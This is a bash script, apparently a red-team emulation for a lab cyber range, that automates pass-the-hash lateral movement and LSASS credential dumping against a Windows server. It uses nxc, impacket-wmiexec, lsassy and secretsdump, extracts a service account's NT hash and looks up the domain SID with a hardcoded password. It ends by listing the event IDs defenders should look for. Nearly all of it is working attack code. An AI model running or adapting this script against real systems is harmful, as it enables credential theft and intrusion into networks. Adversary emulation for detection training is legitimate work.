#!/bin/bash
# ============================================================
# TTP3: Pass-the-Hash Lateral Movement + LSASS Credential Dump
# MITRE: T1550.002 — Use Alternate Authentication Material: Pass the Hash
# MITRE: T1003.001 — OS Credential Dumping: LSASS Memory
# APT29 Ref: Standard post-compromise credential harvesting
# ============================================================
# PURPOSE: Generates Event 4624 Type 3 (PTH logon),
#          Sysmon Event 10 (LSASS access), Event 4688 on SRV06-OPT.
# RUN FROM: Kali (attacker machine)
# PREREQ: Local admin hash from TTP2
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
SRV06="SRV06-OPT.$DOMAIN"
ADMIN_HASH="${1:?Usage: $0 <LOCAL_ADMIN_HASH> [DC_IP]}"
DCIP="${2:-}"

echo "[*] TTP3: PTH Lateral Movement + LSASS Dump — T1550.002 / T1003.001"
echo "[*] Target: $SRV06"
echo ""

echo "[*] Phase 1: Verifying PTH access (local auth)..."
nxc smb "$SRV06" -u 'Administrator' -H "$ADMIN_HASH" --local-auth 2>&1 | tee "$LOOT/ttp3_pth_verify.txt"
sleep 1

echo ""
echo "[*] Phase 2: WMI shell — confirming admin access..."
impacket-wmiexec "./Administrator@$SRV06" -hashes ":$ADMIN_HASH" \
  'whoami && hostname && net localgroup Administrators' 2>&1 | tee "$LOOT/ttp3_wmi_shell.txt"
sleep 2

echo ""
echo "[*] Phase 3: LSASS dump via lsassy module..."
echo "[*] This generates Sysmon Event 10 (LSASS access) on SRV06-OPT"
echo ""
nxc smb "$SRV06" -u 'Administrator' -H "$ADMIN_HASH" --local-auth \
  -M lsassy 2>&1 | tee "$LOOT/ttp3_lsassy.txt"

# Extract svc_sql hash
SVC_SQL_HASH=$(grep -i "svc_sql" "$LOOT/ttp3_lsassy.txt" 2>/dev/null | grep -oP '[a-fA-F0-9]{32}' | head -1)
SVC_SQL_PASS=$(grep -i "svc_sql" "$LOOT/ttp3_lsassy.txt" 2>/dev/null | awk '{print $NF}' | grep -v '[a-f0-9]\{32\}' | head -1)

# Fallback: secretsdump
if [ -z "$SVC_SQL_HASH" ]; then
    echo "[!] lsassy failed. Trying secretsdump..."
    impacket-secretsdump "./Administrator@$SRV06" -hashes ":$ADMIN_HASH" 2>&1 | tee "$LOOT/ttp3_secretsdump.txt"
    SVC_SQL_HASH=$(grep -ai "svc_sql" "$LOOT/ttp3_secretsdump.txt" 2>/dev/null | grep -a ':::$' | awk -F: '{print $(NF-3)}' | head -1)
fi

# Fallback: nxc --lsa
if [ -z "$SVC_SQL_HASH" ]; then
    echo "[!] Trying nxc --lsa..."
    nxc smb "$SRV06" -u 'Administrator' -H "$ADMIN_HASH" --local-auth --lsa 2>&1 | tee "$LOOT/ttp3_lsa.txt"
    SVC_SQL_HASH=$(grep -i "svc_sql" "$LOOT/ttp3_lsa.txt" 2>/dev/null | grep -oP '[a-fA-F0-9]{32}' | head -1)
fi

if [ -n "$SVC_SQL_HASH" ]; then
    echo "[+] svc_sql NT hash: $SVC_SQL_HASH"
    echo "$SVC_SQL_HASH" > "$LOOT/ttp3_svc_sql_hash.txt"
else
    echo "[-] Could not extract svc_sql hash."
fi

# Get Domain SID
if [ -n "$DCIP" ]; then
    echo ""
    echo "[*] Phase 4: Getting Domain SID..."
    DOMAIN_SID=$(impacket-lookupsid "$DOMAIN/svc_web:Summer2025!@DC02.$DOMAIN" 0 2>&1 | grep -oP 'S-1-5-21-[\d-]+' | head -1)
    [ -n "$DOMAIN_SID" ] && echo "[+] Domain SID: $DOMAIN_SID" && echo "$DOMAIN_SID" > "$LOOT/ttp3_domain_sid.txt"
fi

echo ""
echo "[+] TTP3 Complete."
echo "[+] Blue team: check SRV06-OPT Security log for:"
echo "    - Event 4624 Type 3 — local Administrator logon from attacker IP (--local-auth)"
echo "    - Sysmon Event 10 — process accessing LSASS (pid of lsass.exe)"
echo "    - Event 4688 — suspicious child process of WMI host"
echo "[+] Artifacts: $LOOT/ttp3_*"
